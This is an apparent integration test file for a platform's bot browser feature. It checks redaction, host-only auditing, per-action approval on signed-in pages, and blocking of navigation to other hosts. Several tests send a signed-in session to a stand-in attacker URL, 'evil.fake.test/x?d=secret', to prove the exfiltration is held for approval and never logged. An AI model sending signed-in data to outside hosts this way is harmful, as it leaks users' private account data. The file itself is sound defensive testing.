import { randomUUID } from "node:crypto";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { TestClient } from "../../testing";
import { codeOf, type Json, ok, type Res, type SandboxStack, startSandboxStack } from "../../testing-sandbox";
import { createSandboxEventsConsumer, type SandboxdClient } from "../sandbox";

/**
 * 07.8-14 (BRW-01, BRW-03, SBX-04; D-05, D-07, D-09, D-11, D-12, D-13; P-06, P-10, P-18; R2, R8, R9): the bots'
 * browser routes. A bot opens and reads a page only through the Control Plane: decided like a sandbox call (kind
 * `browser`), counted against the shared budget of 40, audited by host only, and read through the API's second pass.
 * Acting on a signed-in page needs the requester's approval every time; D-13 asks before signed-in data leaves for
 * another host. Real PostgreSQL + Redis; the in-memory sandboxd with its fake site (P-13).
 */

const LEAK = "OCW-SENTINEL-PW-5521";
const ACT = "ocw_browser_act";
const OPEN = "ocw_browser_open";
let s: SandboxStack;

const browser = (name: string, ev: Json, body: Json = {}, opts: { agentId?: string; token?: string } = {}) =>
  s.cell(
    `/browser/${name}`,
    { eventId: ev.eventId, agentId: opts.agentId ?? s.scoutId, ...body },
    opts.token,
  );

const setBotBrowser = (agentId: string, on: boolean) =>
  s.su.query(
    "update app.agents set capabilities = capabilities || jsonb_build_object('browser', $2::boolean) where id = $1",
    [agentId, on],
  );

/** A test control of the in-memory sandboxd (no token). */
async function control(path: string, body: Json = {}): Promise<void> {
  const res = await fetch(`${s.sandboxd.url}/__control${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  expect(res.status).toBe(200);
}

/** A sandboxd op called directly (setup only: what plans 16 and 21 will do through the API). */
async function sandboxd(path: string, body: Json): Promise<Json> {
  const res = await fetch(`${s.sandboxd.url}${path}`, {
    method: "POST",
    headers: { authorization: `Bearer ${s.sandboxd.token}`, "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  expect(res.status).toBe(200);
  return (await res.json()) as Json;
}

/** The fake's context state (ids, host and flags only). */
const fakeContext = (contextId: string) =>
  s.sandboxd.stats().browser.contexts.find((c) => c.contextId === contextId) as Json | undefined;

const turnRow = async (eventId: string) =>
  (
    await s.su.query(
      "select tainted, tool_calls, sandbox_calls, member_data from app.agent_turns where event_id = $1",
      [eventId],
    )
  ).rows[0] as Json;

const contextRow = async (id: string) =>
  (await s.su.query("select * from app.browser_contexts where id = $1", [id])).rows[0] as Json;

const auditOf = async (action: string, where: { eventId?: string; contextId?: string }) =>
  (
    await s.su.query(
      `select agent_id, user_id, result, metadata from app.audit_events
        where action = $1 and ($2::text is null or metadata->>'eventId' = $2)
          and ($3::text is null or metadata->>'contextId' = $3) order by occurred_at, id`,
      [action, where.eventId ?? null, where.contextId ?? null],
    )
  ).rows as Json[];

const stepsOf = async (eventId: string) =>
  ((await s.su.query("select steps from app.bot_turn_activity where event_id = $1", [eventId])).rows[0]
    ?.steps ?? []) as Json[];

const callsOf = async (eventId: string) =>
  (
    await s.su.query(
      "select tool, target, decision, reason, status, approval_id from app.agent_tool_calls where event_id = $1 order by created_at",
      [eventId],
    )
  ).rows as Json[];

/** A DM of `who` with a bot. */
async function dmWith(who: TestClient, agentId: string): Promise<string> {
  return (
    await ok(
      who.request("POST", "/api/v1/dms", { participants: [{ kind: "agent", id: agentId }] }) as Promise<Res>,
    )
  ).id as string;
}

/** One pass of sandboxd's event feed through the app's own `browser` handler (the app's consumer is off in tests). */
async function pumpEvents(): Promise<void> {
  const consumer = createSandboxEventsConsumer(s.stack.built.core, {
    client: s.stack.built.sandbox.client as SandboxdClient,
    lockKey: 0x0b0e_1400 + Math.floor(Math.random() * 1000),
    waitMs: 0,
  });
  consumer.onEvent("browser", s.stack.built.browser.onBrowserEvent);
  try {
    await consumer.runOnce({ waitMs: 0 });
  } finally {
    await consumer.stop();
  }
}

/** Every place a value must never reach: audit, ledger, activity, the stream, the API log. */
async function leakCount(sentinel: string): Promise<number> {
  const db = await s.su.query(
    `select (select count(*) from app.bot_turn_activity where steps::text like $1)
          + (select count(*) from app.audit_events where metadata::text like $1)
          + (select count(*) from app.agent_tool_calls where coalesce(reason, '') || coalesce(target, '') like $1)
          + (select count(*) from app.stream_events where payload::text like $1)
          + (select count(*) from app.browser_contexts where host like $1) as n`,
    [`%${sentinel}%`],
  );
  return Number(db.rows[0].n) + s.logs.filter((l) => l.includes(sentinel)).length;
}

beforeAll(async () => {
  s = await startSandboxStack();
  await s.setPolicy({ enabled: true });
  // Many bots open a browser in this file: the default cap (3) is raised; the cap test sets its own.
  await s.su.query("update app.sandbox_policies set max_browsers = 50 where organization_id = $1", [s.orgA]);
  await setBotBrowser(s.scoutId, true);
});

afterAll(async () => {
  await s?.stop();
});

// ---------------------------------------------------------------- Task 1: the tracer

describe("a bot opens a page and reads it through the Control Plane (tracer)", () => {
  it("open: 200 with the host; one context row with its host only; browser.opened by host; tainted; an `opened` step", async () => {
    const ev = await s.turnOf(s.sam, s.samDm);
    expect(ev.turn.tools).toEqual(
      expect.arrayContaining([OPEN, "ocw_browser_snapshot", ACT, "ocw_browser_wait", "ocw_browser_close"]),
    );
    expect(ev.turn.tools).not.toContain("ocw_browser_signin");
    expect(ev.turn.maxSandboxCalls).toBe(40);

    const opened = await ok(browser("open", ev, { url: "https://panel.fake.test/app?token=abc" }));
    expect(opened).toMatchObject({ host: "panel.fake.test", secure: true, signedIn: false });
    expect(opened.contextId).toMatch(/^[0-9a-f-]{36}$/);

    const rows = (
      await s.su.query("select * from app.browser_contexts where agent_id = $1 and event_id = $2", [
        s.scoutId,
        ev.eventId,
      ])
    ).rows as Json[];
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({
      id: opened.contextId,
      host: "panel.fake.test",
      secure: true,
      state: "live",
      requested_for_user_id: s.samId,
      conversation_id: s.samDm,
      closed_at: null,
    });
    expect(JSON.stringify(rows)).not.toMatch(/token=abc|\/app/u);

    const audits = await auditOf("browser.opened", { eventId: ev.eventId });
    expect(audits).toHaveLength(1);
    expect(audits[0]).toMatchObject({ agent_id: s.scoutId, user_id: s.samId, result: "success" });
    expect(audits[0]?.metadata).toMatchObject({ host: "panel.fake.test", contextId: opened.contextId });
    expect(JSON.stringify(audits)).not.toMatch(/token=abc|\/app/u);
    const decided = await auditOf("bot.tool_call", { eventId: ev.eventId });
    expect(decided.map((a) => a.metadata.target)).toEqual(["browser"]);
    expect(JSON.stringify(decided)).not.toMatch(/token=abc|\/app/u);

    expect(await turnRow(ev.eventId)).toMatchObject({ tainted: true, sandbox_calls: 1, tool_calls: 0 });
    const steps = await stepsOf(ev.eventId);
    expect(steps).toHaveLength(1);
    expect(steps[0]).toMatchObject({
      tool: OPEN,
      verb: "opened",
      target: "panel.fake.test",
      contextId: opened.contextId,
      signedIn: false,
      outcome: { kind: "ok" },
    });
    expect(JSON.stringify(steps)).not.toMatch(/token=abc|\/app/u);
    expect(await callsOf(ev.eventId)).toEqual([
      expect.objectContaining({ tool: OPEN, target: "browser", decision: "allowed", status: "ok" }),
    ]);
  });

  it("snapshot: the redacted page with refs; the leak control's value is replaced by the second pass and recorded as an incident with ids only", async () => {
    const ev = await s.turnOf(s.sam, s.samDm);
    const opened = await ok(browser("open", ev, { url: "https://panel.fake.test/login" }));
    const snap = await ok(browser("snapshot", ev));
    expect(snap).toMatchObject({
      contextId: opened.contextId,
      host: "panel.fake.test",
      truncated: false,
      signedIn: false,
    });
    expect(snap.text).toContain('- [r3] textbox "Password" = [redacted]');
    expect(snap.text).toContain('- [r4] button "Sign in"');

    await control("/browser/leak");
    const leaked = await ok(browser("snapshot", ev));
    expect(leaked.text).toContain('- [r3] textbox "Password" = [redacted]');
    expect(JSON.stringify(leaked)).not.toContain(LEAK);
    const incidents = await auditOf("browser.redaction_incident", { contextId: opened.contextId });
    expect(incidents).toHaveLength(1);
    expect(incidents[0]?.metadata).toEqual({ eventId: ev.eventId, contextId: opened.contextId, nodes: 1 });
    expect(s.logs.some((l) => l.includes("redacted field") && l.includes(opened.contextId))).toBe(true);
    expect(await leakCount(LEAK)).toBe(0);

    const steps = await stepsOf(ev.eventId);
    expect(steps.map((st) => [st.verb, st.target, st.outcome.kind])).toEqual([
      ["opened", "panel.fake.test", "ok"],
      ["read_page", "panel.fake.test", "ok"],
      ["read_page", "panel.fake.test", "ok"],
    ]);
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(3);
  });

  it("a second open in the turn reuses the context; another member's turn with the bot gets its own", async () => {
    const ev = await s.turnOf(s.sam, s.samDm);
    const first = await ok(browser("open", ev, { url: "https://panel.fake.test/a" }));
    const again = await ok(browser("open", ev, { url: "https://panel.fake.test/b" }));
    expect(again.contextId).toBe(first.contextId);

    const alexDm = await dmWith(s.alex, s.scoutId);
    const evAlex = await s.turnOf(s.alex, alexDm);
    const alexOpen = await ok(browser("open", evAlex, { url: "https://panel.fake.test/a" }));
    expect(alexOpen.contextId).not.toBe(first.contextId);
    expect((await contextRow(alexOpen.contextId)).requested_for_user_id).toBe(s.alexId);
    const open = (
      await s.su.query(
        "select requested_for_user_id, count(*)::int as n from app.browser_contexts where agent_id = $1 and closed_at is null group by 1",
        [s.scoutId],
      )
    ).rows as Json[];
    for (const r of open) expect(r.n).toBe(1);
  });

  it("a `navigated` event from sandboxd moves the context's host and is audited by host only", async () => {
    const ev = await s.turnOf(s.sam, s.samDm);
    const opened = await ok(browser("open", ev, { url: "https://panel.fake.test/start" }));
    s.sandboxd.fake.emit({
      type: "browser",
      target: { orgId: s.orgA, agentId: s.scoutId },
      contextId: opened.contextId,
      event: "navigated",
      host: "idp.fake.test",
    });
    await pumpEvents();
    expect((await contextRow(opened.contextId)).host).toBe("idp.fake.test");
    const nav = (await auditOf("browser.navigated", { contextId: opened.contextId })).filter(
      (a) => a.metadata.host === "idp.fake.test",
    );
    expect(nav).toHaveLength(1);
    expect(nav[0]?.metadata).toEqual({ contextId: opened.contextId, host: "idp.fake.test" });
    expect(nav[0]).toMatchObject({ agent_id: s.scoutId, user_id: s.samId });
  });

  it("snapshot without an open page is 404 no_context and not counted", async () => {
    const other = await s.newBot(`Pager ${randomUUID().slice(0, 4)}`);
    await setBotBrowser(other.id, true);
    const ev = await s.turnOf(s.sam, other.dm, other.id);
    const r = await browser("snapshot", ev, {}, { agentId: other.id });
    expect(r.status).toBe(404);
    expect(codeOf(r)).toBe("no_context");
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(0);
    expect(await callsOf(ev.eventId)).toEqual([
      expect.objectContaining({ decision: "denied", reason: "no_context", target: "browser" }),
    ]);
  });
});

// ---------------------------------------------------------------- Task 2: acting, the signed-in floor, holds, D-13

/** A sealed browser session row for (member, bot, site) (21 builds the real path; the secret holds no real state). */
async function seedSession(userId: string, agentId: string, site: string): Promise<string> {
  const secret = (
    await s.su.query(
      "insert into app.secrets (organization_id, name, kind, ciphertext, iv, tag) values ($1, $2, 'browser_session', 'x', 'x', 'x') returning id",
      [s.orgA, `browser-session-${randomUUID().slice(0, 8)}`],
    )
  ).rows[0].id as string;
  return (
    await s.su.query(
      `insert into app.browser_sessions (organization_id, user_id, agent_id, site_key, secret_id, expires_at)
       values ($1, $2, $3, $4, $5, now() + interval '30 days') returning id`,
      [s.orgA, userId, agentId, site, secret],
    )
  ).rows[0].id as string;
}

const approvalRow = async (id: string) =>
  (await s.su.query("select * from app.approval_requests where id = $1", [id])).rows[0] as Json;

async function decideApproval(who: TestClient, id: string, outcome: "approved" | "denied") {
  const row = await approvalRow(id);
  return ok(
    who.request("POST", `/api/v1/approvals/${id}/decision`, {
      outcome,
      actionHash: row.action_hash,
    }) as Promise<Res>,
  );
}

/** The one `agent.card_action.v1` of the approval's card (the re-run turn). */
async function rerunOf(approvalId: string): Promise<Json> {
  const row = await approvalRow(approvalId);
  const rows = (
    await s.su.query(
      "select payload from app.stream_events where stream_id = $1 and type = 'agent.card_action.v1' and payload->'cardAction'->>'messageId' = $2 order by seq",
      [`cell:${s.orgA}`, row.card_message_id],
    )
  ).rows;
  expect(rows).toHaveLength(1);
  return rows[0].payload as Json;
}

const view = async (who: TestClient, id: string) =>
  (await ok(who.request("GET", `/api/v1/approvals/${id}`) as Promise<Res>)) as Json;

const navigations = () => s.sandboxd.stats().calls.contextNavigate ?? 0;

/** A fresh bot with its Browser switch on, and Sam's DM with it. */
async function browserBot(name: string): Promise<{ id: string; dm: string }> {
  const bot = await s.newBot(`${name} ${randomUUID().slice(0, 4)}`);
  await setBotBrowser(bot.id, true);
  return bot;
}

describe("acting on an anonymous page (F-7: not side-effecting without a member session)", () => {
  it("open → snapshot → click → snapshot → type runs in one turn without approval; five steps; never the typed text", async () => {
    const TYPED = "OCW-TYPED-7781";
    const ev = await s.turnOf(s.sam, s.samDm);
    const opened = await ok(browser("open", ev, { url: "https://panel.fake.test/login" }));
    await ok(browser("snapshot", ev));
    const click = await ok(browser("act", ev, { action: "click", ref: "r4" }));
    expect(click).toMatchObject({
      contextId: opened.contextId,
      host: "panel.fake.test",
      navigated: false,
      signedIn: false,
      download: null,
    });
    await ok(browser("snapshot", ev));
    await ok(browser("act", ev, { action: "type", ref: "r2", text: TYPED }));

    const asked = await s.su.query(
      "select count(*)::int as n from app.tool_call_approvals where event_id = $1",
      [ev.eventId],
    );
    expect(asked.rows[0].n).toBe(0);
    const steps = await stepsOf(ev.eventId);
    expect(steps.map((st) => [st.verb, st.target, st.outcome.kind])).toEqual([
      ["opened", "panel.fake.test", "ok"],
      ["read_page", "panel.fake.test", "ok"],
      ["clicked", "“Sign in” on panel.fake.test", "ok"],
      ["read_page", "panel.fake.test", "ok"],
      ["typed", "“Email” on panel.fake.test", "ok"],
    ]);
    const acted = await auditOf("browser.acted", { eventId: ev.eventId });
    expect(acted.map((a) => a.metadata)).toEqual([
      expect.objectContaining({ contextId: opened.contextId, host: "panel.fake.test", action: "click" }),
      expect.objectContaining({ contextId: opened.contextId, host: "panel.fake.test", action: "type" }),
    ]);
    expect(await leakCount(TYPED)).toBe(0);
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(5);
  });

  it("a ref that is not on the page → 409 element_gone, not counted; a key sandboxd cannot take → 400", async () => {
    const ev = await s.turnOf(s.sam, s.samDm);
    await ok(browser("open", ev, { url: "https://panel.fake.test/login" }));
    const before = (await turnRow(ev.eventId)).sandbox_calls;
    const gone = await browser("act", ev, { action: "click", ref: "nope" });
    expect(gone.status).toBe(409);
    expect(codeOf(gone)).toBe("element_gone");
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(before);
    const badKey = await browser("act", ev, { action: "press", key: "Shift Tab" });
    expect(badKey.status).toBe(400);
  });
});

describe("a member's session loaded: every action needs the requester's approval (D-11, D-12 U-5, R8, R9)", () => {
  it("click → 409 approval_required (15 min, R8 view, the page held); approved → acts once; again → approval_used", async () => {
    const bot = await browserBot("Shopper");
    const ev = await s.turnOf(s.sam, bot.dm, bot.id);
    const opened = await ok(
      browser("open", ev, { url: "https://panel.fake.test/cart" }, { agentId: bot.id }),
    );
    const session = await seedSession(s.samId, bot.id, "panel.fake.test");
    await s.su.query("update app.browser_contexts set session_id = $2 where id = $1", [
      opened.contextId,
      session,
    ]);
    const callsBefore = (await turnRow(ev.eventId)).sandbox_calls;
    const actsBefore = s.sandboxd.stats().calls.contextAct ?? 0;

    const r = await browser("act", ev, { action: "click", ref: "r4" }, { agentId: bot.id });
    expect(r.status).toBe(409);
    expect(codeOf(r)).toBe("approval_required");
    const approval = r.body?.error.details.approval as Json;
    expect(approval).toMatchObject({
      created: true,
      requesterName: "Sam Lee",
      waitingFor: "Waiting for Sam Lee to approve",
    });
    expect(s.sandboxd.stats().calls.contextAct ?? 0).toBe(actsBefore);
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(callsBefore);
    expect((await turnRow(ev.eventId)).member_data).toBe(true);

    const row = await approvalRow(approval.id);
    const ttl = Date.parse(row.expires_at) - Date.parse(row.created_at);
    expect(ttl).toBeGreaterThan(14 * 60_000);
    expect(ttl).toBeLessThanOrEqual(15 * 60_000 + 1000);
    const ctx = await contextRow(opened.contextId);
    expect(ctx).toMatchObject({ state: "paused", paused_for: "approval" });
    expect(Date.parse(ctx.held_until) - Date.now()).toBeGreaterThan(14 * 60_000);
    expect(fakeContext(opened.contextId)?.held).toBe(true);

    // The activity's waiting step links the card (WINDOWS #245).
    const waiting = (await stepsOf(ev.eventId)).at(-1) as Json;
    expect(waiting).toMatchObject({
      verb: "clicked",
      outcome: { kind: "approval", code: "approval_required" },
      signedIn: true,
    });
    expect(waiting.approvalMessageRoute).toBe(`/chat/dm/${bot.dm}?m=${row.card_message_id}`);

    // R8: what the requester reviews; the source is the browser, never "Web request" (WINDOWS #234).
    const v = await view(s.sam, approval.id);
    expect(v.view.title).toBe("Click “Sign in” on panel.fake.test");
    expect(v.view.source).toMatchObject({ kind: "browser", name: "Browser" });
    expect(v.view.browser).toEqual({
      action: "click",
      element: { role: "button", name: "Sign in" },
      host: "panel.fake.test",
      secure: true,
      signedIn: true,
      sessionSite: "panel.fake.test",
      value: null,
      option: null,
    });
    const card = (
      await s.su.query("select title, fields from app.message_cards where message_id = $1", [
        row.card_message_id,
      ])
    ).rows[0] as Json;
    expect(card.title).toBe("Click “Sign in” on panel.fake.test");
    expect(card.fields).toEqual([
      { label: "Action", value: "Click" },
      { label: "Element", value: "button “Sign in”" },
      { label: "Page", value: "panel.fake.test" },
      { label: "Session", value: "Signed in as you" },
    ]);

    await decideApproval(s.sam, approval.id, "approved");
    const rerun = await rerunOf(approval.id);
    expect(rerun.turn.tools).toContain(ACT);
    const done = await ok(browser("act", rerun, { action: "click", ref: "r4" }, { agentId: bot.id }));
    expect(done).toMatchObject({ contextId: opened.contextId, signedIn: true });
    expect(s.sandboxd.stats().calls.contextAct ?? 0).toBe(actsBefore + 1);
    expect(await callsOf(rerun.eventId)).toEqual([
      expect.objectContaining({ tool: ACT, decision: "allowed", approval_id: approval.id, status: "ok" }),
    ]);
    expect((await approvalRow(approval.id)).consumed_at).not.toBeNull();
    expect(await contextRow(opened.contextId)).toMatchObject({
      state: "live",
      paused_for: null,
      held_until: null,
    });

    const again = await browser("act", rerun, { action: "click", ref: "r4" }, { agentId: bot.id });
    expect(again.status).toBe(409);
    expect(codeOf(again)).toBe("approval_used");
    expect(s.sandboxd.stats().calls.contextAct ?? 0).toBe(actsBefore + 1);
  });

  it("the element is gone when the approved re-run comes → 409 element_gone and the approval stays unused (“Not used”)", async () => {
    const bot = await browserBot("Gone");
    const ev = await s.turnOf(s.sam, bot.dm, bot.id);
    const opened = await ok(
      browser("open", ev, { url: "https://panel.fake.test/login" }, { agentId: bot.id }),
    );
    await s.su.query("update app.browser_contexts set session_id = $2 where id = $1", [
      opened.contextId,
      await seedSession(s.samId, bot.id, "panel.fake.test"),
    ]);
    const r = await browser(
      "act",
      ev,
      { action: "type", ref: "r3", text: "sam@example.test" },
      { agentId: bot.id },
    );
    expect(codeOf(r)).toBe("approval_required");
    const id = r.body?.error.details.approval.id as string;
    const v = await view(s.sam, id);
    expect(v.view.title).toBe("Type into “Password” on panel.fake.test");
    expect(v.view.browser).toMatchObject({ action: "type", value: "sam@example.test" });
    await decideApproval(s.sam, id, "approved");
    // The page changed meanwhile (signed in): the field is gone.
    await control("/browser/signed-in", { contextId: opened.contextId });
    const rerun = await rerunOf(id);
    const actsBefore = s.sandboxd.stats().calls.contextAct ?? 0;
    const gone = await browser(
      "act",
      rerun,
      { action: "type", ref: "r3", text: "sam@example.test" },
      { agentId: bot.id },
    );
    expect(gone.status).toBe(409);
    expect(codeOf(gone)).toBe("element_gone");
    expect(s.sandboxd.stats().calls.contextAct ?? 0).toBe(actsBefore);
    expect(await approvalRow(id)).toMatchObject({ status: "approved", consumed_at: null });
  });

  it("a 07.5 `always` rule on ocw_browser_open applies too (strictest wins with the floor)", async () => {
    const policy = (
      await s.su.query(
        `insert into app.tool_approval_policies
           (organization_id, scope_unit_id, tool_pattern, mode, approver_kind, approver_user_ids, created_by, updated_by)
         values ($1, null, 'ocw_browser_open', 'always', 'requester', '{}', $2, $2) returning id`,
        [s.orgA, s.victorId],
      )
    ).rows[0].id as string;
    try {
      const ev = await s.turnOf(s.sam, s.samDm);
      expect(ev.turn.toolFlags[OPEN]).toMatchObject({ approval: "always" });
      const navBefore = navigations();
      const r = await browser("open", ev, { url: "https://panel.fake.test/policy" });
      expect(r.status).toBe(409);
      expect(codeOf(r)).toBe("approval_required");
      expect(navigations()).toBe(navBefore);
      const row = await approvalRow(r.body?.error.details.approval.id as string);
      expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeLessThanOrEqual(15 * 60_000 + 1000);
      const v = await view(s.sam, row.id);
      expect(v.view.title).toBe("Open panel.fake.test");
      expect(v.view.policy).toMatchObject({ mode: "always", pattern: "ocw_browser_open" });
    } finally {
      await s.su.query("delete from app.tool_approval_policies where id = $1", [policy]);
    }
  });

  it("during a takeover every bot route answers 409 paused without using the budget", async () => {
    const ev = await s.turnOf(s.sam, s.samDm);
    const opened = await ok(browser("open", ev, { url: "https://panel.fake.test/login" }));
    const target = { orgId: s.orgA, agentId: s.scoutId };
    // A takeover the API records (16 holds the lease): refused before any decision.
    await s.su.query(
      "update app.browser_contexts set controller_user_id = $2, lease_expires_at = now() + interval '5 minutes' where id = $1",
      [opened.contextId, s.samId],
    );
    await sandboxd("/v1/browsers/contexts/takeover", { target, contextId: opened.contextId, active: true });
    const before = (await turnRow(ev.eventId)).sandbox_calls;
    const bodies: Array<[string, Json]> = [
      ["open", { url: "https://panel.fake.test/other" }],
      ["snapshot", {}],
      ["act", { action: "click", ref: "r4" }],
      ["screenshot", {}],
      ["wait", { for: "load" }],
      ["close", {}],
    ];
    for (const [name, body] of bodies) {
      const r = await browser(name, ev, body);
      expect(r.status, name).toBe(409);
      expect(codeOf(r), name).toBe("paused");
    }
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(before);
    // A takeover sandboxd reports after the decision (the lease is not recorded yet): refused, and the call refunded.
    await s.su.query(
      "update app.browser_contexts set controller_user_id = null, lease_expires_at = null where id = $1",
      [opened.contextId],
    );
    const raced = await browser("snapshot", ev);
    expect(raced.status).toBe(409);
    expect(codeOf(raced)).toBe("paused");
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(before);
    await sandboxd("/v1/browsers/contexts/takeover", { target, contextId: opened.contextId, active: false });
    expect((await browser("snapshot", ev)).status).toBe(200);
  });
});

describe("D-13: signed-in data never leaves for another host without the requester's yes (P-18)", () => {
  /** A context of (bot, Sam's DM) with Sam's session for panel.fake.test, and member data in the turn. */
  async function signedIn(name: string, opts: { personal?: boolean } = {}) {
    let bot: { id: string; dm: string };
    if (opts.personal) {
      const created = await ok(
        s.sam.request("POST", "/api/v1/agents/personal", {
          name: `${name} ${randomUUID().slice(0, 4)}`,
          instructions: "Answer briefly.",
          modelProvider: "mock",
          modelId: "mock-1",
        }) as Promise<Res>,
      );
      const id = created.agent.id as string;
      await s.su.query(
        'update app.agents set capabilities = capabilities || \'{"sandbox": true, "browser": true}\'::jsonb where id = $1',
        [id],
      );
      bot = { id, dm: await dmWith(s.sam, id) };
    } else {
      bot = await browserBot(name);
    }
    const ev = await s.turnOf(s.sam, bot.dm, bot.id);
    const session = await seedSession(s.samId, bot.id, "panel.fake.test");
    const contextId = (
      await s.su.query(
        `insert into app.browser_contexts
           (organization_id, agent_id, conversation_id, requested_for_user_id, event_id, host, secure, state, session_id)
         values ($1, $2, $3, $4, $5, 'panel.fake.test', true, 'live', $6) returning id`,
        [s.orgA, bot.id, bot.dm, s.samId, ev.eventId, session],
      )
    ).rows[0].id as string;
    await s.su.query("update app.agent_turns set member_data = true where event_id = $1", [ev.eventId]);
    return { bot, ev, contextId };
  }

  it("open to another host → 409 approval_required (`open` view), no navigation; approved → navigates once past the lock", async () => {
    const { bot, ev, contextId } = await signedIn("Courier");
    // The session's own site: no approval; sandboxd re-opens the context site-locked to it.
    const home = await ok(
      browser("open", ev, { url: "https://panel.fake.test/orders" }, { agentId: bot.id }),
    );
    expect(home).toMatchObject({ contextId, host: "panel.fake.test", signedIn: true });
    expect(fakeContext(contextId)?.siteLock).toBe("panel.fake.test");

    const navBefore = navigations();
    const r = await browser("open", ev, { url: "https://evil.fake.test/x?d=secret" }, { agentId: bot.id });
    expect(r.status).toBe(409);
    expect(codeOf(r)).toBe("approval_required");
    expect(navigations()).toBe(navBefore);
    expect(fakeContext(contextId)?.host).toBe("panel.fake.test");
    const id = r.body?.error.details.approval.id as string;
    const v = await view(s.sam, id);
    expect(v.view.title).toBe("Open evil.fake.test");
    expect(v.view.browser).toMatchObject({
      action: "open",
      host: "evil.fake.test",
      sessionSite: "panel.fake.test",
    });
    const row = await approvalRow(id);
    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeLessThanOrEqual(15 * 60_000 + 1000);

    await decideApproval(s.sam, id, "approved");
    const rerun = await rerunOf(id);
    const went = await ok(
      browser("open", rerun, { url: "https://evil.fake.test/x?d=secret" }, { agentId: bot.id }),
    );
    expect(went).toMatchObject({ contextId, host: "evil.fake.test", signedIn: false });
    expect(navigations()).toBe(navBefore + 1);
    expect((await approvalRow(id)).consumed_at).not.toBeNull();
    expect(fakeContext(contextId)?.host).toBe("evil.fake.test");
    // The query never reaches audit, the ledger, the activity, the context row or the log. (The re-run turn's grant,
    // sent to the cell only, carries the exact approved arguments by 07.5's design.)
    const query = await s.su.query(
      `select (select count(*) from app.audit_events where metadata::text like '%d=secret%')
            + (select count(*) from app.agent_tool_calls where coalesce(reason, '') || coalesce(target, '') like '%d=secret%')
            + (select count(*) from app.bot_turn_activity where steps::text like '%d=secret%')
            + (select count(*) from app.browser_contexts where host like '%secret%') as n`,
    );
    expect(Number(query.rows[0].n)).toBe(0);
    expect(s.logs.filter((l) => l.includes("d=secret"))).toEqual([]);
  });

  it("an act whose navigation the site lock stops → 409 approval_required (`open` of that host); the page stays", async () => {
    const { bot, ev, contextId } = await signedIn("Exporter");
    await ok(browser("open", ev, { url: "https://panel.fake.test/orders" }, { agentId: bot.id }));
    // Signed in: the click itself needs the requester first.
    const first = await browser("act", ev, { action: "click", ref: "export-link" }, { agentId: bot.id });
    expect(codeOf(first)).toBe("approval_required");
    const clickId = first.body?.error.details.approval.id as string;
    await decideApproval(s.sam, clickId, "approved");
    const rerun = await rerunOf(clickId);
    const blocked = await browser("act", rerun, { action: "click", ref: "export-link" }, { agentId: bot.id });
    expect(blocked.status).toBe(409);
    expect(codeOf(blocked)).toBe("approval_required");
    expect(fakeContext(contextId)?.host).toBe("panel.fake.test");
    expect((await contextRow(contextId)).host).toBe("panel.fake.test");
    const openId = blocked.body?.error.details.approval.id as string;
    expect(openId).not.toBe(clickId);
    const v = await view(s.sam, openId);
    expect(v.view.title).toBe("Open evil.fake.test");
    expect(v.view.browser).toMatchObject({
      action: "open",
      host: "evil.fake.test",
      sessionSite: "panel.fake.test",
    });
    const acted = await auditOf("browser.acted", { eventId: rerun.eventId });
    expect(acted[0]?.metadata).toMatchObject({
      host: "panel.fake.test",
      action: "click",
      blockedHost: "evil.fake.test",
    });

    // Approved: the same click goes through the lock once.
    await decideApproval(s.sam, openId, "approved");
    const rerun2 = await rerunOf(openId);
    const done = await ok(
      browser("act", rerun2, { action: "click", ref: "export-link" }, { agentId: bot.id }),
    );
    expect(done).toMatchObject({ navigated: true, host: "evil.fake.test" });
    expect((await approvalRow(openId)).consumed_at).not.toBeNull();
    expect(fakeContext(contextId)?.host).toBe("evil.fake.test");
  });

  it("the session's own site needs no D-13 approval; without member data no D-13 approval at all; personal bots too", async () => {
    const own = await signedIn("Homebody");
    await ok(browser("open", own.ev, { url: "https://panel.fake.test/orders" }, { agentId: own.bot.id }));
    const asked = await s.su.query(
      "select count(*)::int as n from app.tool_call_approvals where event_id = $1",
      [own.ev.eventId],
    );
    expect(asked.rows[0].n).toBe(0);

    const plain = await browserBot("Plain");
    const ev = await s.turnOf(s.sam, plain.dm, plain.id);
    await ok(browser("open", ev, { url: "https://panel.fake.test/a" }, { agentId: plain.id }));
    const away = await ok(browser("open", ev, { url: "https://evil.fake.test/x" }, { agentId: plain.id }));
    expect(away.host).toBe("evil.fake.test");
    expect((await turnRow(ev.eventId)).member_data).toBe(false);

    const mine = await signedIn("Mine", { personal: true });
    await ok(browser("open", mine.ev, { url: "https://panel.fake.test/orders" }, { agentId: mine.bot.id }));
    const r = await browser("open", mine.ev, { url: "https://evil.fake.test/x" }, { agentId: mine.bot.id });
    expect(r.status).toBe(409);
    expect(codeOf(r)).toBe("approval_required");
  });
});
